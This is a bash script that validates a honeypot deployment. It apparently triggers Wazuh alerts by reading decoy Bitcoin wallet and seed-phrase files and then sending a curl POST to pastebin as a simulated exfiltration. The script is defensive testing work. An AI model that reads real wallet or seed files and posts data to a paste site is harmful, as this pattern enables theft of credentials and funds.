#!/bin/bash
# Honeypot Deployment Validation Script (Linux)
# This script simulates an attacker accessing honeypot files to verify
# that Wazuh alerts are correctly triggered.

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo "Starting Honeypot Validation..."

# 1. Check if artifacts exist
echo -n "Checking for honeypot artifacts... "
if [ -f "$HOME/.bitcoin/wallets/wallet.dat" ]; then
    echo -e "${GREEN}FOUND${NC}"
else
    echo -e "${RED}NOT FOUND${NC}. Please run deploy.sh or honeypot-deployer generate first."
fi

# 2. Simulate Access (Layer 1 & 2)
echo -e "Simulating wallet access (cat ~/.bitcoin/wallets/wallet.dat)..."
cat "$HOME/.bitcoin/wallets/wallet.dat" > /dev/null 2>&1

echo -e "Simulating seed phrase access (grep 'seed' ~/Documents/seed-backup.txt)..."
if [ -f "$HOME/Documents/seed-backup.txt" ]; then
    grep "seed" "$HOME/Documents/seed-backup.txt" > /dev/null 2>&1
fi

# 3. Simulate Exfiltration Attempt (Layer 3)
echo -e "Simulating exfiltration attempt (curl to pastebin after access)..."
curl -s -X POST -d "test honeypot access" https://pastebin.com/api/post > /dev/null 2>&1 || true

echo -e "\nValidation triggers complete."
echo -e "Please check your Wazuh Dashboard for Rule IDs ${GREEN}100501${NC}, ${GREEN}100510${NC}, and ${GREEN}100520${NC}."
